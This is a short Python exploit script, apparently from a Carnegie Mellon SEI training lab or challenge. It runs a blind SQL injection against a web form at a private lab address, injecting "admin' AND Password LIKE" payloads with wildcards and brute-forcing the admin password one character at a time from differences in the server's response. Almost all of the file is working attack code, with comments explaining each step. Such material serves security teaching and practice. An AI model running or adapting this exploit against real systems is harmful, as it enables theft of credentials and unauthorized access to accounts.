#!/usr/bin/python3

# Copyright 2022 Carnegie Mellon University.
# Released under a MIT (SEI)-style license, please see LICENSE.md in the project 
# root or contact permission@sei.cmu.edu for full terms.

import requests

url = "http://192.168.1.10:5004"                        # URL that will be queried
query_base = "admin' AND Password LIKE '"               # Base query that will be used as the SQL Injection
pswd = ""                                               # Password that we have so far - this starts as nothing
match = "already"                                       # the word "already" appears in the text if the SQL Query is successful
alphabet = "abcdefghijklmnopqrstuvwxyz0123456789"       # alphabet that we will use for our guesses (lowercase alphanumeric)

# Loop through 16 characters -- we have the benefit of knowing the password is 16 characters long
for i in range(0,16):

      # for each character of the alphabet we defined, make a guess to the server
      for c in alphabet:
            guess = f"{c}%"  #    We want to make a guess of the current character plus the % sign (wildcard in SQL)

            query = query_base + pswd + guess     #  form the whole query - the base, plus the password that we know so far, plue our current guess

            data = {'register':query}     #  forming the POST data

            # if the website content matches our expected output, then add the guessed character to the known password and print it
            if match in requests.post(url, data=data).text:
                  pswd = pswd + c
                  print("Password = ", pswd)
